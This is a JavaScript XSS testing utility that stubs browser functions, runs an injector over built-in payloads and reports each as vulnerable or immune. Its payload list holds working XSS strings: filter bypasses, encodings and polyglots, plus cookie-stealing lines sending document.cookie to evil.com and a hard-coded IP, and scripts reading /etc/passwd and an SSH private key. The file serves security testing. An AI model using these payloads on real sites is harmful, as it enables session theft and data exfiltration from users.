/**
 * XSS Payloads
 */

const STUB_OLD_CONSOLE_LOG = console.log

/**
 * Stub Class for constructing Stubs for the XSS Tester
 *
 * @class Stub
 */

class Stub {
	#name
	#runtime
	#calls
	#attachPoint
	constructor(name, func, attach) {
		if (typeof(name) != "string")  throw new Error(`[STUB] [CONSTRUCTOR] 'name' is invalid.`)
		if (typeof(func) != "function") throw new Error(`[STUB] [${name}] 'func' is invalid.`)
		if (typeof(attach) != "string" && typeof(attach) !== "undefined" && attach !== null) throw new Error(`[STUB] [${attach}] 'attach' is invalid.`)

		this.#name = name
		this.#runtime = func
		this.#attachPoint = attach || name
		this.#calls = []
	}

	get name() {
		return this.#name
	}

	get runtime() {
		return {
			run: function() {
				if (typeof(this.#runtime) === "function") this.run(...arguments)//return this.#runtime.apply(this, [...arguments])
				else throw new Error(`[STUB] [${this.name}] Runtime is invalid.`)
			}.bind(this),
			restore: function() {
				if (typeof(this.#runtime) === "function") this.#runtime = null
			}.bind(this)
		}
	}

	get attachmentPoint() {
		return this.#attachPoint
	}

	get calledOnce() {
		return this.#calls.length == 1
	}

	get timesCalled() {
		return this.#calls.length
	}

	called(x) {
		if (x) return this.#calls.length == x
		else return this.#calls.length > 0
	}

	calledWith(arglist) {
		return this.#calls.some(c => this._isEqual(c, arglist))
	}

	getCalls() {
		return this.#calls.slice()
	}

	run() {
		this.#calls.push({ timestamp: Date.now(), args: [...arguments] })
		return this.#runtime.apply(this, [...arguments])
	}

	reset() {
		this.resetProperties()
		this.#runtime = null
	}

	resetProperties() {
		this.#calls = []
	}

	// Helpers

	_isEqual(a, b) {
		let aType;
		let bType;
		if(Array.isArray(a)) {
			aType = 'array';
		} else {
			aType = typeof(a);
		}
		if(Array.isArray(b)) {
			bType = 'array';
		} else {
			bType = typeof(b);
		}
		if(aType !== bType) return false;
		switch(aType) {
			case 'array':
				if(a.length !== b.length) return false;
				for(let i = 0; i < a.length; i++) {
					if(!_isEqual(a[i], b[i])) return false;
				}
				return true;
			case 'object':
				if(Object.keys(a).length !== Object.keys(b).length) return false;
				for(let prop_name in a) {
					if(!b.hasOwnProperty(prop_name)) {
						return false;
					}
					if(!_isEqual(a[prop_name], b[prop_name])) return false;
				}
				return true;
			default:
				return (a === b);
		}
	}
}

class StubManager {
	#stubs
	constructor() {
		this.#stubs = []
	}

	get stubs() {
		return this.#stubs.slice()
	}

	addStub(stub) {
		if (stub instanceof Stub) {
			if (!this.#stubs.some(s => s.name === stub.name)) {
				this.stubs.push(stub)
				return true
			}
		} else return false;
	}

	removeStub(stub) {
		if (typeof(stub) === "string") {
			const ind = this.#stubs.findIndex(s => s.name === stub.name)
			if (ind) {
				this.#stubs.splice(ind, 1)
				return true
			} else return false;
		} else return false;
	}

	async each(callback) {
		for (let stub of this.#stubs) {
			await callback.apply(stub, [])
		}
	}

	reset() {
		this.#stubs = []
	}
}

/**
 * XSS Tester Class for testing a specific element for XSS Vulnerabilities
 *
 * @class XSS
 */
class XSS {
	constructor() {
		if (!window.mdtag?.webcomponent?.hasOwnProperty("debugger")) return false;

		this.debugger = null//new window.mdtag.webcomponent.debugger()
		this.debugEnabled = false
		this.stubs = {
			manager: new StubManager()
		}
		this.injector = null
		this.injectorRunning = false
		this.payloads = {...this.prepare_default_XSS_payloads()}

		this._initDebugger()
	}

	// STUBS

	prepare_stubs(force) {
		if (
			!force &&
			this._isObject(this.stubs) && 
			(
				this._isObject(this.stubs.originals) && !this._isObjectEmpty(this.stubs.originals) &&
				this._isObject(this.stubs.modified) && !this._isObjectEmpty(this.stubs.modified) &&
				this._isObject(this.stubs.libs) && !this._isObjectEmpty(this.stubs.libs)
			)
		) return true;

		this.stubs.manager.reset()

		const originals = {}
		const modified = {}
		const libs = {}
	
		/**
		 * STUB LIBRARIES
		 */
	
		// Console Log
		const lib_console_log = window.console.log
		libs.console = { log: lib_console_log }
	
		/**
		 * STUB PREPARING
		 */
	
		// Alert
		const old_alert = window.alert
		originals.alert = old_alert // window.alert
		const AlertStub = new Stub("alert", function() {
		 	libs.console.log(`[XSS] [ALERT] Alert called with arguments`, [...arguments])
		})
		modified.alert = AlertStub
		this.stubs.manager.addStub(AlertStub)
		// modified.alert = function() {
		// 	libs.console.log(`[XSS] [ALERT] Alert called with arguments`, [...arguments])
		// }
	
		// Console
		originals.console = libs.console
		const ConsoleLogStub = new Stub("console.log", function() {
			libs.console.log(`[XSS] [CONSOLE] [LOG] Console.log called with arguments`, [...arguments])
		})
		modified.console = {
			log: ConsoleLogStub
		}
		this.stubs.manager.addStub(ConsoleLogStub)
		// modified.console = {
		// 	log: function() {
		// 		libs.console.log(`[XSS] [CONSOLE] [LOG] Console.log called with arguments`, [...arguments])
		// 	}
		// }
	
		this.stubs.originals = originals
		this.stubs.modified = modified
		this.stubs.libs = libs
		return true;
	}
	
	apply_stubs() {
		if (!this.stubs?.modified && !(typeof(this.stubs.modified) === "object" && this.stubs.modified !== null)) return false;
	
		for (let [key, value] of Object.entries(this.stubs.modified)) {
			iterate.bind(this)(value)
			//this._setObjectProperty(window, value)
			//window[key] = value.runtime.run
		}

		function iterate(obj) {
			Object.keys(obj).forEach(function(key) {
				if (typeof obj[key] === 'object' && obj[key] !== null) {
					if (obj[key] instanceof Stub) {

						this._setObjectProperty(window, obj[key].attachmentPoint, obj[key].runtime.run)
					} else iterate.bind(this)(obj[key])
				}
			}.bind(this))
		}
	
		return true;
	}
	
	restore_stubs() {
		if (!this.stubs?.originals && !(typeof(this.stubs.originals) === "object" && this.stubs.originals !== null)) return false;
	
		for (let [key, value] of Object.entries(this.stubs.originals)) {
			window[key] = value
		}
	
		return true;
	}

	// INJETOR

	setInjector(injector) {
		this.debug(`[stI] [HEAD] setInjector called.`)
		if (this.injectorRunning) {
			this.debug(`[stI] [APPLY] Finished.`)
			return false;
		}

		if (typeof(injector) === "function") {
			this.injector = injector
			this.debug(`[stI] [APPLY] Finished.`)
			return true;
		} else {
			this.debug(`[stI] [APPLY] Finished.`)
			return false;
		}
	}
	
	hasInjector() {
		this.debug(`[hi] [HEAD] hasInjector called.`)
		this.debug(`[hi] [APPLY] Finished.`)
		return (typeof(this.injector) === "function")
	}

	async startInjector(options) {
		this.debug(`[sI] [HEAD] startInjector called.`)
		if (!this.hasInjector()) return false;
		if (this.injectorRunning) return false;

		this.debug(`[sI] [APPLY] Initializing Injector...`)

		this.injectorRunning = true
		console.log(options?.export?.enabled)
		const registerExport = options?.export?.enabled == true
		console.log(registerExport)
		let exportReg = { // Export Registry
			stubs: {
				performance: {
					init: {},
					cleanup: {}
				}
			},
			payloads: {}
		}

		this.debug(`[sI] [APPLY] Preparing stubs...`)

		if (registerExport) exportReg.stubs.performance.init.start = performance.now()

		this.prepare_stubs()
		this.apply_stubs()

		if (registerExport) {
			exportReg.stubs.performance.init.stop = performance.now()
			exportReg.stubs.performance.init.elapsed = exportReg.stubs.performance.init.stop - exportReg.stubs.performance.init.start
		}

		this.debug(`[sI] [APPLY] Loading Payloads...`)

		const payloads = this.payloads
		const testedPayloads = []

		this.debug(`[sI] [APPLY] Payloads loaded and ready. Starting testing...`)
		this.debug(`[sI] [APPLY] Loaded Payloads:\n--- BEGIN PAYLOAD CONTENT ---\n`, payloads, `\n---- END PAYLOAD CONTENT ----`)

		for (let [key, payload] of Object.entries(payloads)) {
			this.debug(`[sI] [APPLY] Current Payload: ${key}`)
			this.debug(`[sI] [APPLY] Asserting if Payload should be evaluated...`)
			if (!this.injectorRunning) break;

			this.debug(`[sI] [APPLY] Payload authorized to be evaluated.`)
			this.debug(`[sI] [APPLY] Running injector...`)

			if (registerExport) {
				exportReg.payloads[key] = {}
				exportReg.payloads[key].performance = {}
				exportReg.payloads[key].performance.injection = {}
				exportReg.payloads[key].performance.injection.start = performance.now()
			}

			const res = await this._runInjector(payload)

			if (registerExport) {
				exportReg.payloads[key].performance.injection.stop = performance.now()
				exportReg.payloads[key].performance.cleanup = {}
				exportReg.payloads[key].performance.cleanup.start = performance.now()
			}

			await this.stubs.manager.each(function() {
				this.resetProperties()
			})

			if (registerExport) {
				exportReg.payloads[key].performance.cleanup.stop = performance.now()
				exportReg.payloads[key].performance.injection.elapsed = exportReg.payloads[key].performance.injection.stop - exportReg.payloads[key].performance.injection.start
				exportReg.payloads[key].performance.cleanup.elapsed = exportReg.payloads[key].performance.cleanup.stop - exportReg.payloads[key].performance.cleanup.start
			}

			this.debug(`[sI] [APPLY] Injector finished running.`)

			testedPayloads.push({ payload: key, result: res })
			if (!res.success && options?.stopOnFail) break;
		}

		this.debug(`[sI] [APPLY] Payloads tested. Cleaning up...`)

		if (registerExport) exportReg.stubs.performance.cleanup.start = performance.now()

		this.restore_stubs()

		if (registerExport) {
			exportReg.stubs.performance.cleanup.stop = performance.now()
			exportReg.stubs.performance.cleanup.elapsed = exportReg.stubs.performance.cleanup.stop - exportReg.stubs.performance.cleanup.start
		}

		this.debug(`[sI] [APPLY] Generating Test Results...`)

		let resume = [`=============================================\n        XSS Pentesting Tester Results        \n   ---------------------------------------`]
		resume.push(...testedPayloads.map(obj => {
			// if (this.options.fullReport) {
			// 	let res = ""
			// 	if (obj.vulnerable.success) {
			// 		if (obj.vulnerable) res = this.debugger.colorify.red(`✘ VULNERABLE - Application is vulnerable to this payload.`)
			// 		else res = this.debugger.colorify.green(`✔ IMMUNE - Application is not vulnerable to this payload.`)
			// 	} else {
			// 		if (this.options.fullReport) res = this.debugger.colorify.red(`✘ ${obj.payload.toUpperCase()} - Injector threw ${obj.vulnerable.response}`)
			// 		else res = this.debugger.colorify.red(`✘ ${obj.payload.toUpperCase()} - Injector threw an error.`)
			// 	}
			// 	return `----- < PAYLOAD > -----\n  - Payload Key: ${obj.payload.toUpperCase()}\n  - BEGIN PAYLOAD CONTENTS\n${this.payloads[obj.payload]}\n  - END PAYLOAD CONTENTS\n-----------------------`
			// } else {
			// 	if (obj.vulnerable.success) {
			// 		if (obj.vulnerable) return this.debugger.colorify.red(`✘ ${obj.payload.toUpperCase()} - Application is vulnerable to this payload.`)
			// 		else return this.debugger.colorify.green(`✔ ${obj.payload.toUpperCase()} - Application is not vulnerable to this payload.`)
			// 	} else {
			// 		if (this.options.fullReport) return this.debugger.colorify.red(`✘ ${obj.payload.toUpperCase()} - Injector threw ${obj.vulnerable.response}`)
			// 		else return this.debugger.colorify.red(`✘ ${obj.payload.toUpperCase()} - Injector threw an error.`)
			// 	}
			// }

			let res = `	----- < PAYLOAD > -----\n	  - Payload Key: ${obj.payload.toUpperCase()}\n`
			let _payload = {}

			if (obj.result.success) {
				if (typeof(obj.result.response) === "boolean") {
					if (registerExport) {
						_payload.content = this.payloads[obj.payload]
						_payload.safe = obj.result.response === true
						if (options?.fullReport) _payload.response = obj.result.response

						for (let [key, value] of Object.entries(_payload)) {
							exportReg.payloads[obj.payload][key] = value
						}
					}

					if (obj.result.response === true) {
						res += `	  ${this.debugger.colorify.green(`- ✔ IMMUNE - Application is not vulnerable to this payload.`)}`
					} else {
						res += `	  ${this.debugger.colorify.red(`- ✘ VULNERABLE - Application is vulnerable to this payload.`)}`
					}
				} else res += `	  ${this.debugger.colorify.yellow(`- ➖ NOT DETERMINED - Injector's response's type is invalid.`)}`
			} else {
				if (registerExport) {
					_payload.content = this.payloads[obj.payload]
					_payload.safe = null
					if (options?.fullReport) _payload.response = obj.result.response

					for (let [key, value] of Object.entries(_payload)) {
						exportReg.payloads[obj.payload][key] = value
					}
				}

				if (options?.fullReport) res += `	  ${this.debugger.colorify.yellow(`- ✘ NOT DETERMINED - Injector threw ${obj.result.response}`)}`
				else res += `	  ${this.debugger.colorify.yellow(`- ➖ NOT DETERMINED - Injector threw an error.`)}`
			}
			if (options?.fullReport) res += `\n	  - BEGIN PAYLOAD CONTENTS\n${this.payloads[obj.payload]}\n  - END PAYLOAD CONTENTS`

			res += `\n	-----------------------`
			return res
		}))

		resume.push("=============================================")

		const formattedRes = resume.join("\n")

		this.debug(`[sI] [APPLY] Test Results generated.`, `BEGIN TEST REPORT CONTENT\n`, formattedRes, `END TEST REPORT CONTENT`)

		let exportData
		if (options?.export?.stringify) {
			exportData = JSON.stringify(exportReg)
		} else exportData = exportReg

		if (options.export) {
			if (options.export?.copyToClipboard) {
				console.log("Click anywhere outside of the Devtools within 3 seconds...")
				setTimeout(() => this.debugger.copyTextToClipboard(exportData), 3000)
			} else {
				console.log(this.debugger.colorify.magenta(`===================================\n        BEGIN EXPORTED DATA        \n===================================`))
				console.log(exportData)
				console.log(this.debugger.colorify.magenta(`===================================\n         END EXPORTED DATA         \n===================================`))
			}
		}

		if (options?.logResume) console.log(formattedRes)

		this.debug(`[sI] [APPLY] Finished.`)
		return true;
	}
	
	stopInjector() {
		if (!this.hasInjector()) return false;
		if (!this.injectorRunning) return false;

		this.injectorRunning = false
		return true;
	}

	async _runInjector(payload) {
		if (this.hasInjector()) {
			try {
				const res = await this.injector.apply(this, [payload])
				return { success: true, response: res }
			} catch(e) {
				return { success: false, response: new Error(this._isObject(e) ? e.message : e) }
			}
			//return { success: true }
		} else return { success: false }
	}

	// HELPERS

	_isObject(val) {
		return typeof(val) === "object" && val !== null
	}

	_isObjectEmpty(val) {
		return (_isObject(val) ? (Object.values(val).length === 0) : true)
	}

	_setObjectProperty(schema, path, value) {
		const pList = path.split('.');
		const len = pList.length;
		for(let i = 0; i < len-1; i++) {
			let elem = pList[i];
			if( !schema[elem] ) schema[elem] = {}
			schema = schema[elem];
		}
	
		schema[pList[len-1]] = value;
	}
	

	// DEBUGGER HELPERS

	_initDebugger() {
		const init = () => {
			const initial_console_log = window.console.log
			const debug = new window.mdtag.webcomponent.debugger({ logger: initial_console_log })
			debug.componentID = `XSS-${Date.now()}`
			
			this.debugger = debug
		}

		if (this.debugger) {
			if (!(this.debugger instanceof window.mdtag.webcomponent.debugger)) init()
		} else init()
	}

	debug(...args) {
		if (this.debugEnabled === true) {
			if (window.mdtag?.webcomponent?.hasOwnProperty("debugger")) {
				this._initDebugger()
				this.debugger.log(`[XSS]`, ...args)
			} else throw new Error(`[XSS] Could not log debug message: MarkdownTag Debugger not installed.`)
		}
	}

	getLogs(clipboard) {
		if (this.debugEnabled === true) {
			if (window.mdtag?.webcomponent?.hasOwnProperty("debugger")) {
				this._initDebugger()

				const logs = this.debugger.getLogs()
				if (clipboard) {
					console.log("Click anywhere outside of the Devtools within 3 seconds...")
					setTimeout(() => this.debugger.copyTextToClipboard(logs), 3000)
				}
				else return logs
			} else throw new Error(`[XSS] Could not get loggers: MarkdownTag Debugger not installed.`)
		}
	}

	// PAYLOADS

	add_XSS_payload(key, payload) {
		if (typeof(key) !== "string") return false;
		if (typeof(payload) !== "string") return false;
		if (this.payloads[key]) return false;
		
		this.payloads[key] = payload
	}

	prepare_default_XSS_payloads() {
		const basic = `
# Locators
'';!--"<XSS>=&{()}

# 101
<script>alert(1)</script>
<script>+-+-1-+-+alert(1)</script>
<script>+-+-1-+-+alert(/xss/)</script>
%3Cscript%3Ealert(0)%3C%2Fscript%3E
%253Cscript%253Ealert(0)%253C%252Fscript%253E
<svg onload=alert(1)>
"><svg onload=alert(1)>
<iframe src="javascript:alert(1)">
"><script src=data:&comma;alert(1)//
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
%5B'-alert(document.cookie)-'%5D
`
	
		const tagBypass = `
# Tag filter bypass
<svg/onload=alert(1)>
<script>alert(1)</script>
<script     >alert(1)</script>
<ScRipT>alert(1)</sCriPt>
<%00script>alert(1)</script>
<script>al%00ert(1)</script>

# HTML tags
<img/src=x a='' onerror=alert(1)>
<IMG """><SCRIPT>alert(1)</SCRIPT>">
<img src=\`x\`onerror=alert(1)>
<img src='/' onerror='alert("kalisa")'>
<IMG SRC=# onmouseover="alert('xxs')">
<IMG SRC= onmouseover="alert('xxs')">
<IMG onmouseover="alert('xxs')">
<BODY ONLOAD=alert('XSS')>
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
<SCRIPT SRC=http:/evil.com/xss.js?< B >
"><XSS<test accesskey=x onclick=alert(1)//test
<svg><discard onbegin=alert(1)>
<script>image = new Image(); image.src="https://evil.com/?c="+document.cookie;</script>
<script>image = new Image(); image.src="http://"+document.cookie+"evil.com/";</script>

# Other tags
<BASE HREF="javascript:alert('XSS');//">
<DIV STYLE="width: expression(alert('XSS'));">
<TABLE BACKGROUND="javascript:alert('XSS')">
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
<xss id=x tabindex=1 onactivate=alert(1)></xss>
<xss onclick="alert(1)">test</xss>
<xss onmousedown="alert(1)">test</xss>
<body onresize=alert(1)>”onload=this.style.width=‘100px’>
<xss id=x onfocus=alert(document.cookie)tabindex=1>#x’;</script>

# CharCode
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>

# Input already in script tag
@domain.com">user+'-alert\`1\`-'@domain.com

# Scriptless
<link rel=icon href="//evil?
<iframe src="//evil?
<iframe src="//evil?
<input type=hidden type=image src="//evil?

# Unclosed Tags
<svg onload=alert(1)//
`
	
		const bypass = `
# No parentheses
<script>onerror=alert;throw 1</script>
<script>throw onerror=eval,'=alert\x281\x29'</script>
<script>'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}</script>
<script>location='javascript:alert\x281\x29'</script>
<script>alert\`1\`</script>
<script>new Function\`X${document.location.hash.substr`1`}\`</script>

# No parentheses and no semicolons
<script>{onerror=alert}throw 1</script>
<script>throw onerror=alert,1</script>
<script>onerror=alert;throw 1337</script>
<script>{onerror=alert}throw 1337</script>
<script>throw onerror=alert,'some string',123,'haha'</script>

# No parentheses and no spaces:
<script>Function\`X${document.location.hash.substr`1`}\`\`\`</script>

# Angle brackets HTML encoded (in an attribute)
“onmouseover=“alert(1)
‘-alert(1)-’

# If quote is escaped
‘}alert(1);{‘
‘}alert(1)%0A{‘
\’}alert(1);{//

# Embedded tab, newline, carriage return to break up XSS
<IMG SRC="jav&#x09;ascript:alert('XSS');">
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
<IMG SRC="jav&#x0D;ascript:alert('XSS');">

# RegEx bypass
<img src="X" onerror=top[8680439..toString(30)](1337)>

# Other
<svg/onload=eval(atob(‘YWxlcnQoJ1hTUycp’))>: base64 value which is alert(‘XSS’)
`
	
		const encoded = `
# Unicode
<script>\u0061lert(1)</script>
<script>\u{61}lert(1)</script>
<script>\u{0000000061}lert(1)</script>

# Hex
<script>eval('\x61lert(1)')</script>

# HTML
<svg><script>&#97;lert(1)</script></svg>
<svg><script>&#x61;lert(1)</script></svg>
<svg><script>alert&NewLine;(1)</script></svg>
<svg><script>x="&quot;,alert(1)//";</script></svg>
\’-alert(1)//

# URL
<a href="javascript:x='%27-alert(1)-%27';">XSS</a>

# Double URL Encode
%253Csvg%2520o%256Enoad%253Dalert%25281%2529%253E
%2522%253E%253Csvg%2520o%256Enoad%253Dalert%25281%2529%253E

# Unicode + HTML
<svg><script>&#x5c;&#x75;&#x30;&#x30;&#x36;&#x31;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x63;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x35;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x32;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x34;(1)</script></svg>

# HTML + URL
<iframe src="javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'"></iframe>
`
	
		const polyglots = `
jaVasCript:/*-/*\`/*\\\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
-->'"/></sCript><deTailS open x=">" ontoggle=(co\u006efirm)\`\`>
oNcliCk=alert(1)%20)//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>%5Cx3csVg/<img/src/onerror=alert(2)>%5Cx3e
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(document.domain)//'>
javascript:alert();//<img src=x:x onerror=alert(1)>\";alert();//";alert();//';alert();//\`;alert();// alert();//*/alert();//--></title></textarea></style></noscript></noembed></template></select></script><frame src=javascript:alert()><svg onload=alert()><!--
';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//";alert(String.fromCharCode (88,83,83))//";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT>
">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http: //i.imgur.com/P8mL8.jpg"> 
￼￼\`\`\`
%3C!%27/!%22/!\%27/\%22/ — !%3E%3C/Title/%3C/script/%3E%3CInput%20Type=Text%20Style=position:fixed;top:0;left:0;font-size:999px%20*/;%20Onmouseenter=confirm1%20//%3E#
<!'/!”/!\'/\"/ — !></Title/</script/><Input Type=Text Style=position:fixed;top:0;left:0;font-size:999px */; Onmouseenter=confirm1 //>#
jaVasCript:/-//*\/'/"/*/(/ */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/ — !>\x3csVg/<sVg/oNloAd=alert()//>\x3e
">>
” ></plaintext></|><plaintext/onmouseover=prompt(1) >prompt(1)@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>’ →” > "></script>alert(1)”><img/id="confirm( 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'">">
" onclick=alert(1)//<button ' onclick=alert(1)//> */ alert(1)//
?msg=<img/src=\`%00\`%20onerror=this.onerror=confirm(1)
<svg/onload=eval(atob(‘YWxlcnQoJ1hTUycp’))>
<sVg/oNloAd=”JaVaScRiPt:/**\/*\’/”\eval(atob(‘Y29uZmlybShkb2N1bWVudC5kb21haW4pOw==’))”> <iframe src=jaVaScrIpT:eval(atob(‘Y29uZmlybShkb2N1bWVudC5kb21haW4pOw==’))>
';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
jaVasCript:/*-/*\`/*\\\`/*'/*"/**/(/* */oNcliCk=alert())//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouse over=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><imgsrc="http://i.imgur.com/P8mL8.jpg">

# No parenthesis, back ticks, brackets, quotes, braces
a=1337,b=confirm,c=window,c.onerror=b;throw-a

# Another uncommon
'-(a=alert,b="_Y000!_",[b].find(a))-'

# Common XSS in HTML Injection
<svg onload=alert(1)>
</tag><svg onload=alert(1)>
"></tag><svg onload=alert(1)>
'onload=alert(1)><svg/1='
'>alert(1)</script><script/1='
*/alert(1)</script><script>/*
*/alert(1)">'onload="/*<svg/1='
\`-alert(1)">'onload="\`<svg/1='
*/</script>'>alert(1)/*<script/1='
p=<svg/1='&q='onload=alert(1)>
p=<svg 1='&q='onload='/*&r=*/alert(1)'>
q=<script/&q=/src=data:&q=alert(1)>
<script src=data:,alert(1)>
# inline
"onmouseover=alert(1) //
"autofocus onfocus=alert(1) //
# src attribute
javascript:alert(1)
# JS injection
'-alert(1)-'
'/alert(1)//
\'/alert(1)//
'}alert(1);{'
'}alert(1)%0A{'
\'}alert(1);{//
/alert(1)//\
/alert(1)}//\
\${alert(1)}

# XSS onscroll
<p style=overflow:auto;font-size:999px onscroll=alert(1)>AAA<x/id=y></p>#y

# XSS filter bypasss polyglot:
';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//";alert(String.fromCharCode (88,83,83))//";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT>
">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http: //i.imgur.com/P8mL8.jpg"> 

" <script> x=new XMLHttpRequest; x.onload=function(){ document.write(this.responseText.fontsize(1)) }; x.open("GET","file:///home/reader/.ssh/id_rsa"); x.send(); </script>
" <script> x=new XMLHttpRequest; x.onload=function(){ document.write(this.responseText) }; x.open("GET","file:///etc/passwd"); x.send(); </script>

# GO SSTI
{{define "T1"}}<script>alert(1)</script>{{end}} {{template "T1"}}\`

# Some XSS exploitations
- host header injection through xss
add referer: batman 
hostheader: bing.com">script>alert(document.domain)</script><"
- URL redirection through xss
document.location.href="http://evil.com"
- phishing through xss - iframe injection
<iframe src="http://evil.com" height="100" width="100"></iframe>
- Cookie stealing through xss
https://github.com/lnxg33k/misc/blob/master/XSS-cookie-stealer.py
https://github.com/s0wr0b1ndef/WebHacking101/blob/master/xss-reflected-steal-cookie.md
<script>var i=new Image;i.src="http://172.30.5.46:8888/?"+document.cookie;</script>
<img src=x onerror=this.src='http://172.30.5.46:8888/?'+document.cookie;>
<img src=x onerror="this.src='http://172.30.5.46:8888/?'+document.cookie; this.removeAttribute('onerror');">
-  file upload  through xss
upload a picturefile, intercept it, change picturename.jpg to xss paylaod using intruder attack
-  remote file inclusion (RFI) through xss
php?=http://brutelogic.com.br/poc.svg - xsspayload
- convert self xss to reflected one
copy response in a file.html -> it will work

# XSS to SSRF
<esi:include src="http://yoursite.com/capture" />

# XSS to LFI
<script>	x=new XMLHttpRequest;	x.onload=function(){		document.write(this.responseText)	};	x.open("GET","file:///etc/passwd");	x.send();</script>

<img src="xasdasdasd" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
<script>document.write('<iframe src=file:///etc/passwd></iframe>');</scrip>
`

		return {
			basic,
			tagBypass,
			bypass,
			encoded,
			polyglots
		}
	}
}







